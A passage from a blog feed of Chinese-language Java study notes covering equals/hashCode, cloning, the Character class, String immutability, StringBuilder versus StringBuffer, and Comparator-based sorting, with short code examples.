class="hljs-comment">//看两个是不是String类或String类的父类之一，不一定都一样。可以自行建两个类测试。是其之一才比较，不是就不需要比较了</span><br>            String aString = (String)anObject; <span class="hljs-comment">//把两个都转换成相同的String类</span><br>            <span class="hljs-keyword">if</span> (!COMPACT_STRINGS || <span class="hljs-keyword">this</span>.coder == aString.coder) &#123;<br>                <span class="hljs-keyword">return</span> StringLatin1.equals(value, aString.value);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p><strong>要想实现自定义类的 equals 方法比较值，而不是比较地址，可以重写 equals 方法。具体写法可以参考 Object 类和 String 类的equals 方法。</strong></p><h4 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h4><p>hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。</p><p>所以：在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。</p><h4 id="hashCode（）与equals（）"><a href="#hashCode（）与equals（）" class="headerlink" title="hashCode（）与equals（）"></a>hashCode（）与equals（）</h4><p>1.如果两个对象相等，则hashcode一定也是相同的<br>2.两个对象相等,对两个对象分别调用equals方法都返回true<br>3.两个对象有相同的hashcode值，它们也不一定是相等的<br>4.因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖<br>5.hashCode() 的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</p><h4 id="clone"><a href="#clone" class="headerlink" title="clone()"></a>clone()</h4><p>clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。</p><p>克隆（clone方法）为浅拷贝<br>1.浅拷贝：对基本数据类型进行值拷贝，对引用数据类型的引用地址进行拷贝，拷贝对象和原始对象的引用类型引用同一个对象</p><p>2.深拷贝： 对基本数据类型进行值拷贝，对引用数据类型的内容进行拷贝，拷贝对象和原始对象的引用类型引用不同对象。</p><p>深拷贝实现：</p><ul><li>序列化（serialization）这个对象，再反序列化回来，就可以得到这个新的对象，无非就是序列化的规则需要我们自己来写。</li><li>实现Clonable接口，覆盖并重写clone()，除了调用父类中的clone方法得到新的对象， 还要将该类中的引用变量也clone出来。如果只是用Object中默认的clone方法，是浅拷贝的<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Cloneable</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Test <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException </span>&#123;<br>Test newBody = (Test) <span class="hljs-keyword">super</span>.clone();<br>newBody.arr = arr.clone();    <span class="hljs-comment">// 深拷贝实现</span><br><span class="hljs-keyword">return</span> newBody;<br>&#125;<br>   <br>&#125;<br></code></pre></div></td></tr></table></figure>开发中常用的对象拷贝工具：<br>例如DozerMapper、Apache BeanUtils、Spring、Jodd BeanUtils、甚至是Cglib 都提供了这样的功能</li></ul><p>选择Cglib的 BeanCopier 进行Bean拷贝的理由是，其性能要比 **Spring的BeanUtils <strong>，</strong>Apache的BeanUtils **和 PropertyUtils 要好很多，尤其是数据量比较大的情况下</p><p>Cglib 的beans 包 操作:</p><ul><li>BeanCopier：用于两个bean之间，同名属性间的拷贝。</li><li>BulkBean：用于两个bean之间，自定义get&amp;set方法间的拷贝。</li><li>BeanMap：针对POJO Bean与Map对象间的拷贝。</li><li>BeanGenerator：根据Map&lt;String,Class&gt;properties的属性定义，动态生成POJO Bean类。</li></ul>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(三)-Character类</title>
    <link href="/2021/04/09/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%89)-Character%E7%B1%BB/"/>
    <url>/2021/04/09/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%89)-Character%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(三)。Character类。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>1.Character 类用于对单个字符进行操作。<br>2.Character 类在对象中包装一个基本类型 char 的值。<br>3.在实际开发过程中，我们经常会遇到需要使用对象，而不是内置数据类型的情况。为了解决这个问题，Java语言为内置数据类型char提供了包装类Character类。</p></blockquote><p>Character类提供了一系列方法来操纵字符。你可以使用Character的构造方法创建一个Character类对象。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Character ch = <span class="hljs-keyword">new</span> Character(<span class="hljs-string">&#x27;a&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>在某些情况下，Java编译器会自动创建一个Character对象。<br>例如，将一个char类型的参数传递给需要一个Character类型参数的方法时，那么编译器会自动地将char类型参数转换为Character对象。 这种特征称为装箱，反过来称为拆箱。<br>简单理解装箱和拆箱就是：有需要char变为Character时（char—&gt;Character），为装箱；反过来为拆箱。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 原始字符 &#x27;a&#x27; 装箱到 Character 对象 ch 中</span><br>Character ch = <span class="hljs-string">&#x27;a&#x27;</span>;<br> <br><span class="hljs-comment">// 原始字符 &#x27;x&#x27; 用 test 方法装箱</span><br><span class="hljs-comment">// 返回拆箱的值到 &#x27;c&#x27;</span><br><span class="hljs-keyword">char</span> c = test(<span class="hljs-string">&#x27;x&#x27;</span>);<br></code></pre></div></td></tr></table></figure><h3 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h3><p>前面有反斜杠（\）的字符代表转义字符，它对编译器来说是有特殊含义的。</p><table><thead><tr><th align="left">转义序列</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">\t</td><td align="left">在文中该处插入一个tab键</td></tr><tr><td align="left">\b</td><td align="left">在文中该处插入一个后退键</td></tr><tr><td align="left">\n</td><td align="left">在文中该处换行</td></tr><tr><td align="left">\r</td><td align="left">在文中该处插入回车</td></tr><tr><td align="left">\f</td><td align="left">在文中该处插入换页符</td></tr><tr><td align="left">&#39;</td><td align="left">在文中该处插入单引号</td></tr><tr><td align="left">&quot;</td><td align="left">在文中该处插入双引号</td></tr><tr><td align="left">\</td><td align="left">在文中该处插入反斜杠</td></tr></tbody></table><h3 id="Character-方法"><a href="#Character-方法" class="headerlink" title="Character 方法"></a>Character 方法</h3><table><thead><tr><th align="left">序号</th><th align="left">方法与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/java/character-isletter.html">isLetter()</a> 是否是一个字母</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/java/character-isdigit.html">isDigit()</a> 是否是一个数字字符</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/java/character-iswhitespace.html">isWhitespace()</a> 是否是一个空白字符</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/java/character-isuppercase.html">isUpperCase()</a> 是否是大写字母</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/java/character-islowercase.html">isLowerCase()</a> 是否是小写字母</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/java/character-touppercase.html">toUpperCase()</a> 指定字母的大写形式</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/java/character-tolowercase.html">toLowerCase</a>() 指定字母的小写形式</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/java/character-tostring.html">toString</a>() 返回字符的字符串形式，字符串的长度仅为1</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA知识拓展</title>
    <link href="/2021/04/09/JAVA%E7%9F%A5%E8%AF%86%E6%8B%93%E5%B1%95/"/>
    <url>/2021/04/09/JAVA%E7%9F%A5%E8%AF%86%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<p>Java知识拓展。记录一些可能会遇到的问题.</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-String-类对象不可改变"><a href="#1-String-类对象不可改变" class="headerlink" title="1.String 类对象不可改变"></a>1.String 类对象不可改变</h3><p>String 类是不可改变的，但自己去测试的时候发现是可以改变的。如下测试：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s = <span class="hljs-string">&quot;Google&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;s = &quot;</span> + s);<br><br>s = <span class="hljs-string">&quot;lichengloong&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;s = &quot;</span> + s);<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Google<br>lichengloong<br></code></pre></div></td></tr></table></figure><p>通过输出的结果可以发现String是已经改变了的。但为什么说String对象是不可变的呢？</p><blockquote><p>原因在于实例中的 s 只是一个 String 对象的引用，并不是对象本身，当执行 s = “lichengloong”; 创建了一个新的对象 “lichengloong”，而原来的 “Google” 还存在于内存中。如下图。<br><img src="https://img-blog.csdnimg.cn/20210409111345670.png"></p></blockquote><p>String 为啥是不可改变的，可以更具jdk的源码来分析。<br>字符串实际上就是一个 char 数组，并且内部就是封装了一个 char 数组。<br>并且这里 char 数组是被 final 修饰的:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">String</span></span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span>, <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">String</span>&gt;, <span class="hljs-title">CharSequence</span> </span>&#123;<br>    <span class="hljs-comment">/** The value is used for character storage. */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> value[];<br></code></pre></div></td></tr></table></figure><p>并且 String 中的所有的方法，都是对于 char 数组的改变，只要是对它的改变，方法内部都是返回一个新的 String 实例。</p><h3 id="2-length-方法，length-属性和-size-方法的区别"><a href="#2-length-方法，length-属性和-size-方法的区别" class="headerlink" title="2.length() 方法，length 属性和 size() 方法的区别"></a>2.length() 方法，length 属性和 size() 方法的区别</h3><ul><li>1、length() 方法是针对字符串来说的，要求一个字符串的长度就要用到它的length()方法；</li><li>2、length 属性是针对 Java 中的数组来说的，要求数组的长度可以用其 length 属性；</li><li>3、Java 中的 size() 方法是针对泛型集合说的, 如果想看这个泛型有多少个元素, 就调用此方法来查看!<br>例如：<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String array[] = &#123; <span class="hljs-string">&quot;First&quot;</span>, <span class="hljs-string">&quot;Second&quot;</span>, <span class="hljs-string">&quot;Third&quot;</span> &#125;;<br>        String a = <span class="hljs-string">&quot;HelloWorld&quot;</span>;<br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;String&gt;();<br>        list.add(a);<br>        System.out.println(<span class="hljs-string">&quot;数组array的长度为&quot;</span> + array.length);<br>        System.out.println(<span class="hljs-string">&quot;字符串a的长度为&quot;</span> + a.length());<br>        System.out.println(<span class="hljs-string">&quot;list中元素个数为&quot;</span> + list.size());<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果：</span><br>数组array的长度为<span class="hljs-number">3</span><br>字符串a的长度为<span class="hljs-number">10</span><br>list中元素个数为<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure></li></ul><h3 id="3-String、StringBuffer-和-StringBuilder-的区别"><a href="#3-String、StringBuffer-和-StringBuilder-的区别" class="headerlink" title="3.String、StringBuffer 和 StringBuilder 的区别"></a>3.String、StringBuffer 和 StringBuilder 的区别</h3><ul><li><strong>String：</strong>字符串常量，字符串长度不可变。Java中String 是immutable（不可变）的。用于存放字符的数组被声明为final的，因此只能赋值一次，不可再更改。</li><li><strong>StringBuffer：</strong>字符串变量（Synchronized，即线程安全）。如果要频繁对字符串内容进行修改，出于效率考虑最好使用 StringBuffer，如果想转成 String 类型，可以调用 StringBuffer 的 toString() 方法。Java.lang.StringBuffer 线程安全的可变字符序列。在任意时间点上它都包含某种特定的字符序列，但通过某些方法调用可以改变该序列的长度和内容。可将字符串缓冲区安全地用于多个线程。</li><li><strong>StringBuilder：</strong>字符串变量（非线程安全）。在内部 StringBuilder 对象被当作是一个包含字符序列的变长数组。</li></ul><p><strong>基本原则：</strong></p><ul><li>如果要操作少量的数据用 String ；</li><li>单线程操作大量数据用StringBuilder ；</li><li>多线程操作大量数据，用StringBuffer。</li></ul><p>在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。<br>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。<br>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p><p>一般情况下，速度从快到慢为 StringBuilder &gt; StringBuffer &gt; String，当然这是相对的，不是绝对的。</p><h3 id="4-String-类中-concat-方法和-号的区别"><a href="#4-String-类中-concat-方法和-号的区别" class="headerlink" title="4.String 类中 concat() 方法和 + 号的区别"></a>4.String 类中 concat() 方法和 + 号的区别</h3><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">pubic <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br>    <span class="hljs-function">pulic satic <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        String str1 = <span class="hljs-string">&quot;a&quot;</span>.concat(<span class="hljs-string">&quot;b&quot;</span>).concat(<span class="hljs-string">&quot;c&quot;</span>)；<br>        String str2 = <span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-string">&quot;b&quot;</span>+<span class="hljs-string">&quot;c&quot;</span>;<br>        String str3 = <span class="hljs-string">&quot;abc&quot;</span>;<br>        String str4 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;abc&quot;</span>);<br>        System.out.println(str1 == str2); <span class="hljs-comment">//运行结果为false</span><br>        System.out.println(str1 == str3); <span class="hljs-comment">//运行结果为false</span><br>        System.out.println(str2 == str3); <span class="hljs-comment">//运行结果为ture</span><br>        System.out.println(str2 == str4); <span class="hljs-comment">//运行结果为false</span><br>        System.out.println(str1.equals(str4)); <span class="hljs-comment">//运行结果为true</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><p>简单解释：</p><figure class="highlight processing"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs processing">首先关于 <span class="hljs-keyword">new</span> 出来的对象和 <span class="hljs-keyword">String</span> s = <span class="hljs-string">&quot;字符串&quot;</span> 的 == 执行结果为 <span class="hljs-keyword">false</span> 就不多赘述了，因为 == 比较的是两个对象的地址值，equals() 比较的是字面值。那么 <span class="hljs-built_in">concat</span> 方法和 + 号的区别在这里有体现了，我们查看<span class="hljs-built_in">concat</span>方法的源码可以看到，它是通过复制数组在通过 <span class="hljs-built_in">char</span> 数组进行拼接生成一个新的对象，所以地址值会有变动，而 + 号不会。<br></code></pre></div></td></tr></table></figure><h3 id="5-JAVA的sort实现降序排序"><a href="#5-JAVA的sort实现降序排序" class="headerlink" title="5.JAVA的sort实现降序排序"></a>5.JAVA的sort实现降序排序</h3><h4 id="1）利用-Collections-reverseOrder-方法（Collections-是一个包装类）"><a href="#1）利用-Collections-reverseOrder-方法（Collections-是一个包装类）" class="headerlink" title="1）利用 Collections.reverseOrder() 方法（Collections 是一个包装类）"></a>1）利用 Collections.reverseOrder() 方法（Collections 是一个包装类）</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer[] a=&#123;<span class="hljs-number">25</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">23</span>,<span class="hljs-number">489</span>,<span class="hljs-number">1</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>&#125;;<span class="hljs-comment">//一定要为 Interger 类型</span><br>        Arrays.sort(a, Collections.reverseOrder());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> t:a)&#123;<br>            System.out.println(t);<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h4 id="2）实现-Comparator-接口的复写-compare-方法"><a href="#2）实现-Comparator-接口的复写-compare-方法" class="headerlink" title="2）实现 Comparator 接口的复写 compare() 方法"></a>2）实现 Comparator 接口的复写 compare() 方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Integer[] a=&#123;<span class="hljs-number">25</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">23</span>,<span class="hljs-number">489</span>,<span class="hljs-number">1</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>&#125;;<br>        Comparator cmp = <span class="hljs-keyword">new</span> MyComparator();<br>        Arrays.sort(a, cmp);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> t:a)&#123;<br>            System.out.println(t);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 实现Comparator接口</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">Integer</span>&gt; </span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> </span>&#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         *正常的升序排序</span><br><span class="hljs-comment">         *o1 - 要比较的第一个对象。</span><br><span class="hljs-comment">         *o2 - 要比较的第二个对象。</span><br><span class="hljs-comment">         *根据第一个参数小于、等于或大于第二个参数分别返回负整数、零或正整数。</span><br><span class="hljs-comment">         *实现降序排序</span><br><span class="hljs-comment">         * 如果o1小于o2，我们就返回正值，如果o1大于o2我们就返回负值,这样颠倒一下，就可以实现降序排序了,反之即可自定义升序排序了</span><br><span class="hljs-comment">         */</span><br>            <span class="hljs-keyword">return</span> o2 - o1;<br>        &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(二)-字符串处理</title>
    <link href="/2021/04/09/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%8C)-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"/>
    <url>/2021/04/09/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%8C)-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>Java基础知识复习。字符串处理。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-String-类"><a href="#1-String-类" class="headerlink" title="1.String 类"></a>1.String 类</h3><p>通过使用 String 类的构造方法来创建字符串，该类位于 java.lang 包中。String 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串。<br><strong>注意：</strong><br>String 类是不可改变的，所以你一旦创建了 String 对象，那它的值就无法改变了<br>如果需要对字符串做很多修改，那么应该选择使用 StringBuffer 或者 StringBuilder 类。<br>至于为什么String类是不可改变的，而你自己去测试时发现是可以改变的，原因可在另一篇《Java知识拓展》 中看 。</p><p>String 创建的字符串存储在公共池中，而 new 创建的字符串对象在堆上：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-string">&quot;lichengloong&quot;</span>;              <span class="hljs-comment">// String 直接创建</span><br>String s2 = <span class="hljs-string">&quot;lichengloong&quot;</span>;              <span class="hljs-comment">// String 直接创建</span><br>String s3 = s1;                    <span class="hljs-comment">// 相同引用</span><br>String s4 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;lichengloong&quot;</span>);   <span class="hljs-comment">// String 对象创建</span><br>String s5 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;lichengloong&quot;</span>);   <span class="hljs-comment">// String 对象创建</span><br></code></pre></div></td></tr></table></figure><p>简单理解：</p><ul><li>公共池：就是相同的东西只有一个，所有需要他的都指向他。比如上例中的，s1、s2、s3都是指向的公共池中的同一个 lichengloong 。虽然有三个创建，但只有一个 lichengloong 。</li><li> 堆：就是new 一个就有一个。要多少就建多少。比如上例中的s4、s5就是各自创建了一个，并不是指向的同一个，而是自己是自己的。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210409105208801.png"></p><h4 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String site = <span class="hljs-string">&quot;lichengloong&quot;</span>;<br><span class="hljs-keyword">int</span> len = site.length(); <span class="hljs-comment">//length()方法与length属性区别开，具体见《java知识拓展》</span><br></code></pre></div></td></tr></table></figure><h4 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h4><p>String 类提供了连接两个字符串的方法：</p><blockquote><p>1.string1.concat(string2);返回 string2 连接 string1 的新字符串。也可以对字符串常量使用 concat() 方法，如：”我的名字是 “.concat(“lichengloong”);<br>2.更常用的是使用’+’操作符来连接字符串，如：”Hello,” + “lichengloong” + “!”</p></blockquote><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>输出格式化数字可以使用 printf() 和 format() 方法。<br>String 类使用静态方法 format() 返回一个String 对象而不是 PrintStream 对象。<br>String 类的静态方法 format() 能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。<br>例子：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.printf(<span class="hljs-string">&quot;浮点型变量的值为 &quot;</span> +<br>                  <span class="hljs-string">&quot;%f, 整型变量的值为 &quot;</span> +<br>                  <span class="hljs-string">&quot; %d, 字符串变量的值为 &quot;</span> +<br>                  <span class="hljs-string">&quot;is %s&quot;</span>, floatVar, intVar, stringVar);<br></code></pre></div></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String fs;<br>fs = String.format(<span class="hljs-string">&quot;浮点型变量的值为 &quot;</span> +<br>                   <span class="hljs-string">&quot;%f, 整型变量的值为 &quot;</span> +<br>                   <span class="hljs-string">&quot; %d, 字符串变量的值为 &quot;</span> +<br>                   <span class="hljs-string">&quot; %s&quot;</span>, floatVar, intVar, stringVar);<br></code></pre></div></td></tr></table></figure><h3 id="2-StringBuffer-类"><a href="#2-StringBuffer-类" class="headerlink" title="2.StringBuffer 类"></a>2.StringBuffer 类</h3><p>StringBuffer 类是可变字符串类，创建 StringBuffer 类的对象后可以随意修改字符串的内容。每个 StringBuffer 类的对象都能够存储指定容量的字符串，如果字符串的长度超过了 StringBuffer 类对象的容量，则该对象的容量会自动扩大。</p><h4 id="创建-StringBuffer-类"><a href="#创建-StringBuffer-类" class="headerlink" title="创建 StringBuffer 类"></a>创建 StringBuffer 类</h4><p>StringBuffer 类提供了 3 